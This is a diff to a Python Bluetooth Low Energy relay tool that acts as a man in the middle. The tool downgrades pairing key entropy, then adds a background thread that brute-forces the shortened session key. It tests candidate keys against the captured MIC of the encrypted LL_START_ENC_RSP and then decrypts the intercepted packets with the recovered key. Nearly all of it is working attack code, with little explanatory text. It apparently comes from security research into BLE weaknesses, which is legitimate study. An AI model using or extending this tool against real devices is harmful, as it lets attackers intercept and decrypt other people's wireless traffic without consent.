@@ -8,6 +8,8 @@
 
 import argparse, sys, signal
 import serial
+import threading
+
 from binascii import unhexlify
 from queue import Queue
 from time import time
@@ -23,6 +25,7 @@ from sniffle.packet_decoder import DPacketMessage, DataMessage, LlDataContMessag
 from sniffle.relay_protocol import RelayServer, MessageType, ErrorCode
 
 from mitble_help import downgrade_pairing_request, downgrade_pairing_response
+from brute_forcer import make_ble_ccm_nonce, ble_ccm_encrypt, ble_ccm_decrypt_verify
 
 """
 Relay attack principles:
@@ -76,6 +79,11 @@ Empty--------->
 
 # global variable to access hardware
 hw = None
+
+found_key = None                  # 16-byte session key when discovered
+_found_key_lock = threading.Lock()
+bruteforce_stop = threading.Event()
+bruteforce_thread = None
 
 # global variable for pcap writer
 pcwriter = None
@@ -337,6 +345,7 @@ def _extract_smp_key_size_from_ll_body(ll_body: bytes):
         return (None, None)
     return (smp_code, smp[4])
 
+
 def _extract_ivm_from_ll_enc_req(ctrl: LlControlMessage):
     """
     LL_ENC_REQ (0x03), length 23:
@@ -366,10 +375,120 @@ def _extract_ivs_from_ll_enc_rsp(ctrl: LlControlMessage):
         return None
     return body[-4:]  # bytes 9..12
 
+def brute_force_key_worker(hdr0: int,
+                           iv: bytes,
+                           enc_opcode: bytes,
+                           enc_mic_on_air: bytes,
+                           new_key_size: int,
+                           direction_bit: int):
+    """
+    Background brute-forcer targeting the encrypted LL_START_ENC_RSP.
 
+    hdr0           : LL data header first octet from the PDU
+    iv             : 8-byte IV (IVm||IVs) for the *real* C<->P link
+    enc_opcode     : 1-byte encrypted opcode from the packet
+    enc_mic_on_air : 4-byte MIC from the packet (on-air, encrypted tag)
+    new_key_size   : number of unknown key bytes (1..16). First (16-new_key_size)
+                     bytes are assumed to be 0x00.
+    direction_bit  : 1 for Central->Peripheral, 0 for Peripheral->Central
+    """
+    global found_key
+
+    print(f"[BRUTE] Starting key search with new_key_size={new_key_size} bytes")
+
+    # Nonce for the FIRST encrypted LL_START_ENC_RSP (packetCounter = 0)
+    nonce = make_ble_ccm_nonce(iv, packet_counter=0, direction_bit=direction_bit)
+
+    zero_prefix_len = 16 - new_key_size
+    suffix_bits = 8 * new_key_size
+    total_candidates = 1 << suffix_bits
+
+    # Plaintext payload we know for LL_START_ENC_RSP
+    plain_payload = b"\x06"
+
+    for idx in range(total_candidates):
+        if bruteforce_stop.is_set():
+            print("[BRUTE] Stop signal set, exiting worker.")
+            return
+
+        # Generate candidate key lazily: 00..00 || suffix
+        suffix = idx.to_bytes(new_key_size, "big")
+        key = b"\x00" * zero_prefix_len + suffix
+
+        try:
+            # AES-CCM encrypt one-byte opcode 0x06
+            cipher_payload, tag = ble_ccm_encrypt(
+                key=key,
+                nonce=nonce,
+                header_first_octet=hdr0,
+                payload=plain_payload,
+            )
+        except Exception:
+            # Bad inputs etc. Don't let one failure kill the worker.
+            continue
+
+        # 1) First filter: MIC/tag must match the captured MIC
+        if tag != enc_mic_on_air:
+            continue
+
+        # 2) Only for MIC matches, check encrypted opcode byte
+        if cipher_payload[:1] != enc_opcode:
+            continue
+
+        # Both checks passed → very strong evidence we found the correct key
+        with _found_key_lock:
+            found_key = key
+        print(f"[BRUTE] Found session key: {key.hex()}")
+        bruteforce_stop.set()
+        return
+
+    print("[BRUTE] Exhausted key space without finding key.")
+
+
+def decrypt_if_possible(pkt: DataMessage, direction_bit: int):
+    """Best-effort decrypt of an encrypted DataMessage once we know the key."""
+    if found_key is None or iv_real_cp is None:
+        return
+
+    # Only handle actual data PDUs, skip empty LL_DATA_CONT
+    if not isinstance(pkt, DataMessage):
+        return
+
+    pdu = pkt.body
+    if len(pdu) < 2:
+        return
+
+    hdr0 = pdu[0]
+    length = pdu[1]
+    payload = pdu[2:2+length]
+    if len(payload) < 5:
+        return
+
+    ciphertext = payload[:-4]
+    tag_on_air = payload[-4:]
+
+    # TODO: maintain a per-direction packetCounter so you can build the right nonce.
+    # For the first encrypted packet we know it's 0; for later packets you'll want
+    # to increment counters per direction.
+    packet_counter = 0  # placeholder – you can wire real counters later
+    nonce = make_ble_ccm_nonce(iv_real_cp, packet_counter, direction_bit)
+
+    try:
+        pt = ble_ccm_decrypt_verify(
+            key=found_key,
+            nonce=nonce,
+            header_first_octet=hdr0,
+            ciphertext=ciphertext,
+            tag=tag_on_air,
+        )
+        print(f"[DEC] Decrypted payload dir={direction_bit}: {_hx(pt)}")
+    except ValueError:
+        # MIC failed – either wrong counter or retransmit, etc.
+        pass
 
 def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
     global enc_start_seen, first_enc_rsp_pkt   # <<<
+    global ivm_from_c, ivs_from_p, iv_real_cp   # ← add this
 
     msg = hw.recv_and_decode()
 
@@ -379,8 +498,12 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
         empty = isinstance(msg, LlDataContMessage) and msg.data_length == 0
         block_req = filter_changes and is_param_req(msg)
 
-
-                # --- here: LL_ENC_RSP from *real peripheral* ---
+        #try to decrypt if key is found
+        if isinstance(msg, DataMessage):
+            direction_bit = 1 if getattr(msg, "data_dir", 0) == 1 else 0
+            decrypt_if_possible(msg, direction_bit)
+        
+        # --- here: LL_ENC_RSP from *real peripheral* ---
         if isinstance(msg, LlControlMessage) and msg.opcode == 0x04:
             ivs = _extract_ivs_from_ll_enc_rsp(msg)
             if ivs is not None:
@@ -427,6 +550,25 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
                 print("[ENC] Encrypted opcode:", _hx(enc_opcode))
                 print("[ENC] Encrypted MIC   :", _hx(enc_mic))
 
+                # Start brute-forcer if we have the real IV and not already started
+                global bruteforce_thread
+                if iv_real_cp is not None and bruteforce_thread is None and found_key is None:
+                    hdr0 = pdu[0]           # LL data header first octet
+                    # For this LL_START_ENC_RSP we know packetCounter=0.
+                    # direction_bit: choose 0 or 1 depending on which direction
+                    # this encrypted RSP is on (e.g. 1 for C->P on C_r<->P).
+                    direction_bit = 1       # example for central->peripheral on this link
+
+                    bruteforce_thread = threading.Thread(
+                        target=brute_force_key_worker,
+                        args=(hdr0, iv_real_cp, enc_opcode, enc_mic, new_key_size, direction_bit),
+                        daemon=True,
+                    )
+                    bruteforce_thread.start()
+                    print("[BRUTE] Brute-force worker started in background.")
+                elif iv_real_cp is None:
+                    print("[BRUTE] WARNING: IV not known yet, cannot start brute-forcer.")
+
         # --------------------------------------------------------------------  # <<<
 
         # Try to downgrade entropy on outgoing DataMessage LL bodies
@@ -453,6 +595,7 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
 
 
 def sock_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
+    global ivm_from_c, ivs_from_p, iv_real_cp   # ← add this
     # receive packets from relay slave and retransmit them here
     mtype, body = conn.recv_msg()
     if mtype != MessageType.PACKET:
